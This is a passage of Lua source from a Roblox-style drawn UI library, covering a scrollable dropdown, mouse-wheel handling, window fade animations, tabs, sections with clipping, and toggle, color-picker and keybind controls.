                local z = library.zindexOrder.dropdown;

                objs.background = utility:Draw('Square', {
                    Visible = false;
                    Size = newUDim2(1,-3,0,50);
                    Position = newUDim2(0,3,1,0);
                    ThemeColor = 'Background';
                    ZIndex = z;
                    Parent = window.objects.background;
                })

                objs.border1 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z-1;
                    Parent = objs.background;
                })

                objs.border2 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border 1';
                    ZIndex = z-2;
                    Parent = objs.border1;
                })

                objs.border3 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z-3;
                    Parent = objs.border2;
                })

            end

            -- // Scrollable list
            -- only `max` rows exist (a small reused pool); scrolling just changes which values they show.
            -- scroll with the mouse wheel, or drag the scrollbar on the right.
            local dropdown = window.dropdown
            local ROW, PAD = 22, 2
            local z = library.zindexOrder.dropdown
            dropdown.scroll = 0

            dropdown.objects.scrollTrack = utility:Draw('Square', {
                Size = newUDim2(0,4,1,-4);
                Position = newUDim2(1,-7,0,2);
                ThemeColor = 'Option Background';
                ZIndex = z+3;
                Visible = false;
                Parent = dropdown.objects.background;
            })

            dropdown.objects.scrollThumb = utility:Draw('Square', {
                Size = newUDim2(1,0,0,10);
                ThemeColor = 'Accent';
                ZIndex = z+4;
                Parent = dropdown.objects.scrollTrack;
            })

            local function isSelected(list, val)
                if typeof(list.selected) == 'table' then
                    return table.find(list.selected, val) ~= nil
                end
                return list.selected == val
            end

            function dropdown:GetMax()
                local list = self.selected
                return math.max(1, floor((list and list.maxVisible) or self.max or 8))
            end

            function dropdown:ClampScroll()
                local list = self.selected
                local count = list and #list.values or 0
                self.scroll = clamp(floor(self.scroll or 0), 0, math.max(count - self:GetMax(), 0))
            end

            function dropdown:Scroll(delta)
                local before = self.scroll
                self.scroll = (self.scroll or 0) + delta
                self:ClampScroll()
                if self.scroll ~= before then
                    self:Refresh()
                end
            end

            -- scrolls so the selected value sits in the middle of the list
            function dropdown:ScrollToSelected()
                local list = self.selected
                if not list then return end
                local target = typeof(list.selected) == 'table' and list.selected[1] or list.selected
                local idx = table.find(list.values, target)
                self.scroll = idx and (idx - math.ceil(self:GetMax() / 2)) or 0
                self:ClampScroll()
            end

            function dropdown:Close()
                local list = self.selected
                if list then
                    list.open = false
                    list.objects.openText.Text = '+'
                end
                self.selected = nil
                self.draggingScroll = false
                self.objects.background.Visible = false
            end

            function dropdown:GetRow(slot)
                local row = self.objects.values[slot]
                if row then return row end

                row = {}
                row.background = utility:Draw('Square', {
                    Size = newUDim2(1,-4,0,ROW);
                    Color = Color3.new(.25,.25,.25);
                    Transparency = 0;
                    ZIndex = z+1;
                    Parent = self.objects.background;
                })
                row.text = utility:Draw('Text', {
                    Position = newUDim2(0,5,0,4);
                    ThemeColor = 'Option Text 2';
                    Size = 13;
                    Font = 2;
                    ZIndex = z+2;
                    Parent = row.background;
                })

                utility:Connection(row.background.MouseEnter, function()
                    local list = self.selected
                    if list and row.value ~= nil and not isSelected(list, row.value) then
                        row.text.ThemeColor = 'Accent'
                    end
                end)

                utility:Connection(row.background.MouseLeave, function()
                    local list = self.selected
                    row.text.ThemeColor = (list and row.value ~= nil and isSelected(list, row.value)) and 'Option Text 1' or 'Option Text 2'
                end)

                utility:Connection(row.background.MouseButton1Down, function()
                    local list = self.selected
                    if not list then return end
                    local val = list.values[(self.scroll or 0) + slot]
                    if val == nil then return end

                    local newSelected = list.multi and {} or val
                    if list.multi then
                        for _, v in next, (typeof(list.selected) == 'table' and list.selected or {}) do
                            if v ~= 'none' then
                                table.insert(newSelected, v)
                            end
                        end
                        local found = table.find(newSelected, val)
                        if found then
                            table.remove(newSelected, found)
                        else
                            table.insert(newSelected, val)
                        end
                    end

                    list:Select(newSelected)
                    if list.multi then
                        self:Refresh()
                    else
                        self:Close()
                    end
                end)

                self.objects.values[slot] = row
                return row
            end

            function dropdown:Refresh()
                local list = self.selected
                if list == nil then return end
                self:ClampScroll()

                local max = self:GetMax()
                local count = #list.values
                local shown = math.min(count, max)
                local scrollable = count > max
                local rowWidth = scrollable and -12 or -4

                for slot = 1, math.max(shown, #self.objects.values) do
                    local val = slot <= shown and list.values[self.scroll + slot] or nil
                    local row = val ~= nil and self:GetRow(slot) or self.objects.values[slot]
                    if row then
                        row.value = val
                        row.background.Visible = val ~= nil
                        if val ~= nil then
                            local selected = isSelected(list, val)
                            row.background.Position = newUDim2(0,2,0,2 + (slot - 1) * (ROW + PAD))
                            row.background.Size = newUDim2(1,rowWidth,0,ROW)
                            row.background.Transparency = selected and 1 or 0
                            row.text.Text = tostring(val)
                            row.text.ThemeColor = selected and 'Option Text 1' or (row.background.Hover and 'Accent' or 'Option Text 2')
                        end
                    end
                end

                local height = math.max(2 + shown * (ROW + PAD), 4)
                self.objects.background.Size = newUDim2(1,-6,0,height)

                local track, thumb = self.objects.scrollTrack, self.objects.scrollThumb
                track.Visible = scrollable
                if scrollable then
                    local trackHeight = height - 4
                    local thumbHeight = math.max(floor(trackHeight * max / count), 12)
                    local y = floor((trackHeight - thumbHeight) * (self.scroll / (count - max)))
                    thumb.Size = newUDim2(1,0,0,thumbHeight)
                    thumb.Position = newUDim2(0,0,0,y)
                end

                library.hoverDirty = true
            end

            -- scrollbar dragging: thumb follows the mouse
            local function scrollToMouse(pos)
                local list = dropdown.selected
                if not list then return end
                local trackData = library.drawings[dropdown.objects.scrollTrack.Object]
                local thumbData = library.drawings[dropdown.objects.scrollThumb.Object]
                if not trackData or not thumbData then return end
                local trackHeight = trackData.AbsoluteSize.Y
                local thumbHeight = thumbData.AbsoluteSize.Y
                local maxScroll = #list.values - dropdown:GetMax()
                if maxScroll <= 0 or trackHeight <= thumbHeight then return end
                local rel = clamp((pos.Y - trackData.AbsolutePosition.Y - thumbHeight / 2) / (trackHeight - thumbHeight), 0, 1)
                local target = floor(rel * maxScroll + .5)
                if target ~= dropdown.scroll then
                    dropdown.scroll = target
                    dropdown:Refresh()
                end
            end

            for _, handle in ipairs({dropdown.objects.scrollTrack, dropdown.objects.scrollThumb}) do
                utility:Connection(handle.MouseButton1Down, function(pos)
                    dropdown.draggingScroll = true
                    scrollToMouse(pos)
                end)
            end

            utility:Connection(mousemove, function(pos)
                if dropdown.draggingScroll then
                    scrollToMouse(pos)
                end
            end)

            utility:Connection(button1up, function()
                dropdown.draggingScroll = false
            end)

            -- is the mouse over the open dropdown? (checks its cached screen rect directly)
            local function mouseOverDropdown()
                if not library.open or dropdown.selected == nil then return false end
                local data = library.drawings[dropdown.objects.background.Object]
                if not data or not data.AbsVisible then return false end
                local m = getPointer()
                local p, s = data.AbsolutePosition, data.AbsoluteSize
                return m.X >= p.X and m.Y >= p.Y and m.X <= p.X + s.X and m.Y <= p.Y + s.Y
            end

            -- is the mouse over the tab sidebar?
            local function mouseOverSidebar()
                local data = library.drawings[window.objects.sidebar.Object]
                if not data or not data.AbsVisible then return false end
                local m = getPointer()
                local p, s = data.AbsolutePosition, data.AbsoluteSize
                return m.X >= p.X and m.Y >= p.Y and m.X <= p.X + s.X and m.Y <= p.Y + s.Y
            end

            -- mouse wheel scrolling. UserInputService still fires when a GUI (like the menu's input blocker)
            -- has already processed the wheel, unlike ContextActionService, which never saw it.
            utility:Connection(inputservice.InputChanged, function(input)
                if input.UserInputType == Enum.UserInputType.MouseWheel then
                    local z = input.Position.Z
                    if z ~= 0 then
                        if mouseOverDropdown() then
                            dropdown:Scroll(z > 0 and -1 or 1)
                        elseif window.open and (window.maxTabScroll or 0) > 0 and mouseOverSidebar() then
                            -- long tab list: scroll it
                            window.tabScroll = clamp((window.tabScroll or 0) + (z > 0 and -30 or 30), 0, window.maxTabScroll)
                            window:UpdateTabs()
                        elseif window.open and window.selectedTab then
                            -- scroll content area: check if mouse is over the group background
                            local gbData = library.drawings[window.objects.groupBackground.Object]
                            if gbData then
                                local mp = getPointer()
                                local gp, gs = gbData.AbsolutePosition, gbData.AbsoluteSize
                                if mp.X >= gp.X and mp.X <= gp.X + gs.X and mp.Y >= gp.Y and mp.Y <= gp.Y + gs.Y then
                                    local tab = window.selectedTab
                                    if tab and tab.maxScrollY and tab.maxScrollY > 0 then
                                        local step = 30
                                        tab.scrollY = clamp((tab.scrollY or 0) + (z > 0 and -step or step), 0, tab.maxScrollY)
                                        tab:UpdateSections()
                                    end
                                end
                            end
                        end
                    end
                end
            end)

            -- only sinks the wheel (so the camera doesn't zoom) while scrolling the dropdown; never scrolls by itself
            local wheelAction = 'UIDropdownScroll_'..http:GenerateGUID(false)
            pcall(function()
                actionservice:BindActionAtPriority(wheelAction, function()
                    if mouseOverDropdown() then
                        return Enum.ContextActionResult.Sink
                    end
                    if window.open and (window.maxTabScroll or 0) > 0 and mouseOverSidebar() then
                        return Enum.ContextActionResult.Sink
                    end
                    -- also sink wheel when scrolling the content area
                    if window.open and window.selectedTab and window.selectedTab.maxScrollY and window.selectedTab.maxScrollY > 0 then
                        local gbData = library.drawings[window.objects.groupBackground.Object]
                        if gbData then
                            local mp = getPointer()
                            local gp, gs = gbData.AbsolutePosition, gbData.AbsoluteSize
                            if mp.X >= gp.X and mp.X <= gp.X + gs.X and mp.Y >= gp.Y and mp.Y <= gp.Y + gs.Y then
                                return Enum.ContextActionResult.Sink
                            end
                        end
                    end
                    return Enum.ContextActionResult.Pass
                end, false, Enum.ContextActionPriority.High.Value + 100, Enum.UserInputType.MouseWheel)
            end)
            utility:Connection(library.unloaded, function()
                pcall(function()
                    actionservice:UnbindAction(wheelAction)
                end)
            end)

            -- clicking anywhere outside an open dropdown / color picker closes it
            utility:Connection(button1down, function()
                local hoverObj = utility:GetHoverObject()
                local hoverData = hoverObj and library.drawings[hoverObj] or nil
                local list = dropdown.selected
                if list and not utility:IsInside(hoverData, list.objects.holder) then
                    dropdown:Close()
                end
                local color = window.colorpicker.selected
                if color and not utility:IsInside(hoverData, color.objects.holder) then
                    color:SetOpen(false)
                end
            end)

            dropdown:Refresh();

            -- drops down a few pixels while fading in (and jumps to the selected value)
            function window.dropdown:AnimateOpen()
                local anim = library.animations
                self:ScrollToSelected()
                self:Refresh()
                utility:SlideIn(self.objects.background, newUDim2(0,3,1,0), newUDim2(0,0,0,-anim.popupOffset), anim.popup)
                utility:FadeIn(self.objects.background, anim.popup)
            end

            function window.colorpicker:AnimateOpen()
                local anim = library.animations
                utility:SlideIn(self.objects.background, newUDim2(1,-200,1,10), newUDim2(0,0,0,-anim.popupOffset), anim.popup)
                utility:FadeIn(self.objects.background, anim.popup)
            end
        end
        -------------------------

        local function tooltip(option)
            utility:Connection(option.objects.holder.MouseEnter, function()
                tooltipObjects.background.Visible = (not (option.tooltip == '' or option.tooltip == nil)) and true or false;
                tooltipObjects.riskytext.Visible = option.risky;
                tooltipObjects.text.Position = option.risky and newUDim2(0,60,0,0) or newUDim2(0,3,0,0)
                tooltipObjects.text.Text = tostring(option.tooltip);
                library.CurrentTooltip = option;
            end)
            utility:Connection(option.objects.holder.MouseLeave, function()
                if library.CurrentTooltip == option then
                    library.CurrentTooltip = nil;
                    tooltipObjects.background.Visible = false
                end
            end)
        end


        local visValues = {};

        local fadeTime = .18;
        local openGeneration = 0;

        function window:SetOpen(bool)
            if typeof(bool) == 'boolean' then
                self.open = bool;
                openGeneration += 1;
                local generation = openGeneration;

                local objs = self.objects.background:GetDescendants()
                table.insert(objs, self.objects.background)

                if bool then
                    self.objects.background.Visible = true;
                    -- rise into place (restPosition is the dragged position, so spamming the key can't drift the window)
                    local anim = library.animations
                    local running = library.tweens[self.objects.background] and library.tweens[self.objects.background].Position
                    if not running then
                        self.restPosition = self.objects.background.Position
                    end
                    if self.restPosition then
                        utility:SlideIn(self.objects.background, self.restPosition, newUDim2(0, 0, 0, anim.windowOffset), anim.window)
                    end
                else
                    -- hide after the fade, unless the menu was reopened in the meantime
                    task.delay(fadeTime, function()
                        if generation == openGeneration and not window.open then
                            window.objects.background.Visible = false;
                        end
                    end)
                end

                for _,v in next, objs do
                    local obj = v.Object
                    if obj ~= nil then
                        if bool then
                            -- only restore things we faded out (fresh objects already have the right value)
                            if visValues[v] ~= nil then
                                utility:Tween(obj, 'Transparency', visValues[v], fadeTime, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);
                                utility:SetRestingTransparency(obj, visValues[v]);
                                visValues[v] = nil;
                            end
                        elseif obj.Transparency ~= 0 then
                            -- remember the real value once, so spamming the keybind can't "lose" it mid-fade
                            if visValues[v] == nil then
                                visValues[v] = utility:GetRestingTransparency(obj);
                            end
                            utility:Tween(obj, 'Transparency', 0, fadeTime, Enum.EasingDirection.Out, Enum.EasingStyle.Quad);
                            utility:SetRestingTransparency(obj, visValues[v]);
                        end
                    end
                end
            end
        end

        function window:AddTab(text, order, icon)
            local tab = {
                text = text;
                order = order or #self.tabs+1;
                icon = icon;
                callback = function() end;
                objects = {};
                sections = {};
            }

            table.insert(self.tabs, tab);

            --- Create Objects ---
            do
                local objs = tab.objects;
                local z = library.zindexOrder.window + 5;

                -- one row in the sidebar; UpdateTabs stacks them and slides the accent bar
                objs.background = utility:Draw('Square', {
                    Size = newUDim2(1,0,0,30);
                    Parent = self.objects.tabHolder;
                    ThemeColor = 'Unselected Tab Background';
                    ZIndex = z;
                })

                objs.text = utility:Draw('Text', {
                    ThemeColor = 'Unselected Tab Text';
                    Text = text;
                    Size = 13;
                    Font = 2;
                    ZIndex = z+1;
                    Outline = true;
                    Center = false;
                    Parent = objs.background;
                })

                -- optional image icon to the left of the tab name
                -- (a string starting with the PNG magic bytes, e.g. library.IconPNG('1f384')).
                -- anything else = no icon, just the name.
                if type(tab.icon) == 'string' and tab.icon:sub(1, 4) == '\137PNG' then
                    objs.icon = utility:Draw('Image', {
                        Size = newUDim2(0, 13, 0, 13);
                        Data = tab.icon;
                        ZIndex = z+1;
                        Position = newUDim2(0, 10, .5, -6);
                        Parent = objs.background;
                    })
                end

                utility:Connection(objs.background.MouseEnter, function()
                    if not tab.selected then
                        objs.text.ThemeColor = 'Selected Tab Text';
                        objs.background.ThemeColorOffset = 5;
                    end
                end)

                utility:Connection(objs.background.MouseLeave, function()
                    if not tab.selected then
                        objs.text.ThemeColor = 'Unselected Tab Text';
                        objs.background.ThemeColorOffset = 0;
                    end
                end)

                utility:Connection(objs.background.MouseButton1Down, function(pos)
                    tab:Select();
                    window:BeginTabScroll(pos); -- on phones, dragging from a tab scrolls a long tab list
                end)

            end
            ----------------------

            function tab:AddSection(text, side, order)
                local section = {
                    text = tostring(text);
                    side = side == nil and 1 or clamp(side,1,2);
                    order = order or #self.sections+1;
                    enabled = true;
                    objects = {};
                    options = {};
                };

                table.insert(self.sections, section);

                --- Create Objects ---
                -- a card: header strip with the title over the option list
                local HEADER_H = 22
                do
                    local objs = section.objects;
                    local z = library.zindexOrder.window+15;

                    -- invisible anchor with the section's full size: everything is laid out from it
                    objs.background = utility:Draw('Square', {
                        Transparency = 0;
                        ZIndex = z;
                        Parent = window.objects['columnholder'..(section.side)];
                    })

                    -- the visible card. when the section is scrolled partly out of the panel, the card is
                    -- trimmed to the part that's inside (see section:ApplyClip), since Drawing can't clip
                    objs.card = utility:Draw('Square', {
                        Size = newUDim2(1,0,1,0);
                        ThemeColor = 'Section Background';
                        ZIndex = z;
                        Parent = objs.background;
                    })

                    objs.innerBorder = utility:Draw('Square', {
                        Size = newUDim2(1,2,1,2);
                        Position = newUDim2(0,-1,0,-1);
                        ThemeColor = 'Border 1';
                        ZIndex = z-1;
                        Parent = objs.card;
                    })

                    objs.outerBorder = utility:Draw('Square', {
                        Size = newUDim2(1,2,1,2);
                        Position = newUDim2(0,-1,0,-1);
                        ThemeColor = 'Border 3';
                        ZIndex = z-2;
                        Parent = objs.innerBorder;
                    })

                    objs.header = utility:Draw('Square', {
                        Size = newUDim2(1,0,0,HEADER_H);
                        ThemeColor = 'Title Background';
                        ZIndex = z+1;
                        Parent = objs.background;
                    })

                    objs.headerLine = utility:Draw('Square', {
                        Size = newUDim2(1,0,0,1);
                        Position = newUDim2(0,0,1,0);
                        ThemeColor = 'Border 1';
                        ZIndex = z+2;
                        NoHit = true;
                        Parent = objs.header;
                    })

                    objs.textlabel = utility:Draw('Text', {
                        Position = newUDim2(.5,0,0,4);
                        ThemeColor = 'Primary Text';
                        Size = 13;
                        Font = 2;
                        Outline = true;
                        Center = true;
                        ZIndex = z+3;
                        Parent = objs.header;
                    })

                    objs.optionholder = utility:Draw('Square',{
                        Size = newUDim2(1-.03,0,1,-(HEADER_H+12));
                        Position = newUDim2(.015,0,0,HEADER_H+6);
                        Transparency = 0;
                        ZIndex = z+1;
                        Parent = objs.background;
                    })

                    -- touch: dragging on the section itself (not on an option) scrolls the tab
                    for _, handle in ipairs({objs.background, objs.card, objs.header, objs.optionholder}) do
                        utility:Connection(handle.MouseButton1Down, function(pos)
                            window:BeginTouchScroll(pos)
                        end)
                    end

                end
                ----------------------

                function section:SetText(text)
                    self.text = tostring(text);
                    self.objects.textlabel.Text = self.text;
                end

                function section:UpdateOptions()
                    table.sort(self.options, function(a,b)
                        return a.order < b.order
                    end)

                    local ySize, padding = 0, 0;
                    for i,option in next, self.options do
                        option.objects.holder.Visible = option.enabled and not option.clipped
                        if option.enabled then
                            option.objects.holder.Position = newUDim2(0,0,0,ySize);
                            ySize += option.objects.holder.Object.Size.Y + padding;
                        end
                    end

                    -- header + top gap + options + bottom gap
                    self.objects.background.Size = newUDim2(1,0,0,HEADER_H + 6 + ySize + 6);

                    -- the section's height changed: re-lay out (and re-clip) the tab once, at the end of this frame
                    if not tab.relayoutQueued then
                        tab.relayoutQueued = true
                        task.defer(function()
                            tab.relayoutQueued = false
                            if section.objects.background.Object ~= nil then -- not unloaded
                                tab:UpdateSections()
                            end
                        end)
                    end
                end

                -- keeps the section inside the content panel: `top` is where the section starts inside the
                -- column (after scrolling), `viewH` the column's visible height. the card is trimmed to the
                -- visible part, the header and option rows that don't fully fit are hidden.
                function section:ApplyClip(top, viewH)
                    local objs = self.objects
                    local h = objs.background.Object.Size.Y
                    local clipTop = clamp(-top, 0, h)
                    local clipBottom = clamp(viewH - top, 0, h)
                    objs.card.Position = newUDim2(0, 0, 0, clipTop)
                    objs.card.Size = newUDim2(1, 0, 0, math.max(clipBottom - clipTop, 0))

                    local headerFits = top >= 0 and top + HEADER_H <= viewH
                    if objs.header.Visible ~= headerFits then
                        objs.header.Visible = headerFits
                    end

                    local base = top + HEADER_H + 6
                    for _, option in ipairs(self.options) do
                        local holder = option.objects.holder
                        if holder and holder.Object then
                            local y = base + holder.Position.Y.Offset
                            local clipped = y < 0 or y + holder.Object.Size.Y > viewH
                            if option.clipped ~= clipped then
                                option.clipped = clipped
                                holder.Visible = option.enabled and not clipped
                                -- an open dropdown / color picker on a row that scrolled away closes
                                if clipped then
                                    if window.dropdown.selected == option then
                                        window.dropdown:Close()
                                    end
                                    if option.open and option.SetOpen then
                                        pcall(option.SetOpen, option, false)
                                    end
                                end
                            end
                        end
                    end
                end

                function section:SetEnabled(bool)
                    if typeof(bool) == 'boolean' then
                        section.enabled = bool;
                        tab:UpdateSections();
                    end
                end

                ------- Options -------

                -- // Toggle
                function section:AddToggle(data)
                    local toggle = {
                        class = 'toggle';
                        flag = data.flag;
                        text = '';
                        tooltip = '';
                        order = #self.options+1;
                        state = false;
                        risky = false;
                        keybind = false; -- true = adds a [NONE] keybind that flips this toggle
                        callback = function() end;
                        enabled = true;
                        options = {};
                        objects = {};
                    };

                    local blacklist = {'objects'};
                    for i,v in next, data do
                        if not table.find(blacklist, i) and toggle[i] ~= nil then
                            toggle[i] = v
                        end
                    end

                    -- accept the names other ui libs use for the starting state (default / value / toggled)
                    if typeof(data.state) ~= 'boolean' then
                        for _, alias in ipairs({'default', 'value', 'toggled'}) do
                            if typeof(data[alias]) == 'boolean' then
                                toggle.state = data[alias]
                                break
                            end
                        end
                    end

                    table.insert(self.options, toggle)

                    if toggle.flag then
                        library.flags[toggle.flag] = toggle.state;
                        library.options[toggle.flag] = toggle;
                    end

                    --- Create Objects ---
                    do
                        local objs = toggle.objects;
                        local z = library.zindexOrder.window+25;

                        objs.holder = utility:Draw('Square', {
                            Size = newUDim2(1,0,0,24);
                            Transparency = 0;
                            ZIndex = z+5;
                            Parent = section.objects.optionholder;
                        })

                        -- switch: a little track with a knob that slides across when it's on
                        objs.background = utility:Draw('Square', {
                            Size = newUDim2(0,28,0,14);
                            Position = newUDim2(0,2,0,5);
                            ThemeColor = 'Option Background';
                            ZIndex = z+3;
                            Parent = objs.holder;
                        })

                        objs.gradient = utility:Draw('Image', {
                            Size = newUDim2(1,0,1,0);
                            Data = library.images.gradientp45;
                            Visible = false; -- flat look (gradient kept for scripts that want it back)
                            Transparency = .25;
                            ZIndex = z+4;
                            Parent = objs.background;
                        })

                        objs.knob = utility:Draw('Square', {
                            Size = newUDim2(0,10,0,10);
                            Position = newUDim2(0,2,0,2);
                            ThemeColor = 'Option Text 3';
                            ZIndex = z+5;
                            NoHit = true;
                            Parent = objs.background;
                        })

                        objs.border1 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 1';
                            ZIndex = z+2;
                            Parent = objs.background;
                        })

                        objs.border2 = utility:Draw('Square', {
                            Size = newUDim2(1,2,1,2);
                            Position = newUDim2(0,-1,0,-1);
                            ThemeColor = 'Option Border 2';
                            ZIndex = z+1;
                            Parent = objs.border1;
                        })

                        objs.text = utility:Draw('Text', {
                            Position = newUDim2(0,40,0,5);
                            ThemeColor = 'Option Text 3';
                            Size = 13;
                            Font = 2;
                            ZIndex = z+1;
                            Outline = true;
                            Parent = objs.holder;
                        })

                        utility:Connection(objs.holder.MouseEnter, function()
                            objs.border1.ThemeColor = 'Accent';
                        end)

                        utility:Connection(objs.holder.MouseLeave, function()
                            objs.border1.ThemeColor = toggle.state and 'Accent' or 'Option Border 1';
                        end)

                        utility:Connection(objs.holder.MouseButton1Down, function()
                            toggle:SetState(not toggle.state);
                        end)

                    end
                    ----------------------

                    function toggle:SetState(bool, nocallback)
                        if typeof(bool) == 'boolean' then
                            self.state = bool;
                            if self.flag then
                                library.flags[self.flag] = bool;
                            end

                            self.objects.border1.ThemeColor = bool and 'Accent' or (self.objects.holder.Hover and 'Accent' or 'Option Border 1');
                            self.objects.text.ThemeColor = bool and (self.risky and 'Risky Text Enabled' or 'Option Text 1') or (self.risky and 'Risky Text' or 'Option Text 3');
                            self.objects.background.ThemeColor = bool and 'Accent' or 'Option Background';
                            self.objects.background.ThemeColorOffset = bool and -40 or 0

                            -- slide the knob (instant the first time, so default-on toggles start in place)
                            local knob = self.objects.knob
                            local knobPos = bool and newUDim2(1,-12,0,2) or newUDim2(0,2,0,2)
                            knob.ThemeColor = bool and 'Option Text 1' or 'Option Text 3'
                            if self.knobReady and library.animations.enabled then
                                utility:Tween(knob, 'Position', knobPos, .14, Enum.EasingDirection.Out, Enum.EasingStyle.Quad)
                            else
                                knob.Position = knobPos
                            end
                            self.knobReady = true

                            if not nocallback then
                                self.callback(bool);
                            end

                            if self.linkedBind then
                                self.linkedBind:RefreshIndicator();
                            end

                            -- keys that drive this toggle (toggle:AddBind) follow its state, however it changed
                            for _, opt in ipairs(self.options) do
                                if opt.class == 'bind' and not opt.linked and not opt.separate then
                                    opt.state = bool
                                    if opt.flag then
                                        library.flags[opt.flag] = bool
                                    end
                                    if opt.indicatorValue then
                                        opt.indicatorValue:SetEnabled(bool and opt.bind ~= 'none' and not opt.noindicator)
                                    end
                                end
                            end

                        end
                    end

                    function toggle:SetText(str)
                        if typeof(str) == 'string' then
                            self.text = str;
                            self.objects.text.Text = str;
                        end
                    end

                    function toggle:UpdateOptions()
                        table.sort(self.options, function(a,b)
                            return a.order < b.order
                        end)

                        local x, y = 0, 0
                        for i,option in next, self.options do
                            option.objects.holder.Visible = option.enabled
                            if option.enabled then
                                if option.class == 'color' or option.class == 'bind' then
                                    option.objects.holder.Position = newUDim2(1,-option.objects.holder.Object.Size.X-x,0,0);
                                    x = x + option.objects.holder.Object.Size.X;
                                elseif option.class == 'slider' or option.class == 'list' then
                                    option.objects.holder.Position = newUDim2(0,0,1,-option.objects.holder.Object.Size.Y-y);
                                    y = y + option.objects.holder.Object.Size.Y;
                                end
                            end
                        end

                        self.objects.holder.Size = newUDim2(1,0,0,24 + y);
                        section:UpdateOptions()

                    end

                    -- // Toggle Addons
                    function toggle:AddColor(data)
                        local color = {
                            class = 'color';
                            flag = data.flag;
                            text = '';
                            tooltip = '';
                            order = #self.options+1;
                            callback = function() end;
                            color = Color3.new(1,1,1);
                            trans = 0;
                            open = false;
                            enabled = true;
                            objects = {};
                        };
    
                        local blacklist = {'objects'};
                        for i,v in next, data do
                            if not table.find(blacklist, i) and color[i] ~= nil then
                                color[i] = v
                            end
                        end
                        
                        table.insert(self.options, color)
    
                        if color.flag then
                            library.flags[color.flag] = color.color;
                            library.options[color.flag] = color;
                        end
    
                        --- Create Objects ---
                        do
                            local objs = color.objects;
                            local z = library.zindexOrder.window+25;
    
                            objs.holder = utility:Draw('Square', {
                                Size = newUDim2(0,26,0,24);
                                Transparency = 0;
                                ZIndex = z+6;
                                Parent = self.objects.holder;
                            })
    
                            objs.background = utility:Draw('Square', {
                                Size = newUDim2(0,20,0,12);
                                Position = newUDim2(0,4,0,6);
                                ZIndex = z+3;
                                Parent = objs.holder;
                            })
    
                            objs.gradient = utility:Draw('Image', {
                                Size = newUDim2(1,0,1,0);
                                Data = library.images.gradientp45;
                                Visible = false; -- flat look (gradient kept for scripts that want it back)
                                Transparency = .25;
                                ZIndex = z+4;
                                Parent = objs.background;
                            })
    
                            objs.border1 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 1';
                                ZIndex = z+2;
                                Parent = objs.background;
                            })
    
                            objs.border2 = utility:Draw('Square', {
                                Size = newUDim2(1,2,1,2);
                                Position = newUDim2(0,-1,0,-1);
                                ThemeColor = 'Option Border 2';
                                ZIndex = z+1;
                                Parent = objs.border1;
                            })
    
                            utility:Connection(objs.holder.MouseEnter, function()
                                objs.border1.ThemeColor = 'Accent';
                            end)
    
                            utility:Connection(objs.holder.MouseLeave, function()
                                objs.border1.ThemeColor = color.open and 'Accent' or 'Option Border 1';
                            end)
    
                            utility:Connection(objs.holder.MouseButton1Down, function()
                                color:SetOpen(not color.open);
                            end)
    
                        end
                        ----------------------

    
                        function color:SetColor(c3, nocallback)
                            if typeof(c3) == 'Color3' then
                                local h,s,v = c3:ToHSV(); c3 = fromhsv(h, clamp(s,.005,.995), clamp(v,.005,.995))
                                self.color = c3;
                                self.objects.background.Color = c3;
                                if not nocallback then
                                    self.callback(c3, self.trans);
                                end
                                if self.open then
                                    window.colorpicker:Visualize(self.color, self.trans);
                                end
                                if self.flag then
                                    library.flags[self.flag] = c3;
                                end
                            end
                        end
    
                        function color:SetTrans(trans, nocallback)
                            if typeof(trans) == 'number' then
                                self.trans = trans;
                                if not nocallback then
                                    self.callback(self.color, trans);
                                end
                                if self.open then
                                    window.colorpicker:Visualize(self.color, self.trans);
                                end
                            end
                        end
    
                        function color:SetOpen(bool)
                            if typeof(bool) == 'boolean' then
                                self.open = bool
                                if bool then
                                    if window.colorpicker.selected then
                                        window.colorpicker.selected.open = false;
                                    end
                                    window.colorpicker.selected = color
                                    window.colorpicker.objects.background.Parent = self.objects.background;
                                    window.colorpicker.objects.background.Visible = true;
                                    window.colorpicker:Visualize(color.color, color.trans)
                                    window.colorpicker:AnimateOpen()
                                elseif window.colorpicker.selected == color then
                                    window.colorpicker.selected = nil;
                                    window.colorpicker.objects.background.Parent = window.objects.background;
                                    window.colorpicker.objects.background.Visible = false;
                                end
                            end
                        end
    
                        tooltip(color);
                        color:SetColor(color.color, true);
                        color:SetTrans(color.trans, true);
                        self:UpdateOptions();
                        return color
                    end

                    function toggle:AddBind(data)
                        local bind = {
                            class = 'bind';
                            flag = data.flag;
                            text = '';
                            tooltip = '';
                            bind = 'none';
                            mode = 'toggle';
                            order = #self.options+1;
                            callback = function() end;
                            keycallback = function() end;
                            indicatorValue = library.keyIndicator:AddValue({value = 'value', key = 'key', enabled = false});
                            noindicator = false;
                            invertindicator = false;
                            state = false;
                            nomouse = false;
                            enabled = true;
                            binding = false;
                            linked = false; -- true = the key flips this toggle, 'none' = unbound (see toggle:AddKeybind)
                            -- false (default) = the key drives the toggle it sits on: 'toggle' mode flips it,
                            -- 'hold' mode turns it on while held. true = the old behaviour, where the key only
                            -- flips its own flag / callback and leaves the toggle alone.
                            separate = false;
                            holding = false;
                            objects = {};
                        };
    
                        local blacklist = {'objects'};
                        for i,v in next, data do
                            if not table.find(blacklist, i) and bind[i] ~= nil then
                                bind[i] = v
                            end
                        end
                        
                        table.insert(self.options, bind)
    
                        if bind.flag then
                            library.options[bind.flag] = bind;
                        end

                        -- (an unbound key - 'none' - is simply off: it never turns anything on)
    
                        --- Create Objects ---
                        do
                            local objs = bind.objects;
                            local z = library.zindexOrder.window+25;
    
                            objs.holder = utility:Draw('Square', {
                                Size = newUDim2(0,0,0,24);
                                Transparency = 0;
                                ZIndex = z+6;
                                Parent = self.objects.holder;
                            })
    
                            objs.keyText = utility:Draw('Text', {
                                ThemeColor = 'Option Text 3';
                                Size = 13;
                                Font = 2;
                                ZIndex = z+1;
                                Parent = objs.holder;
                            })
    
                            utility:Connection(objs.holder.MouseEnter, function()
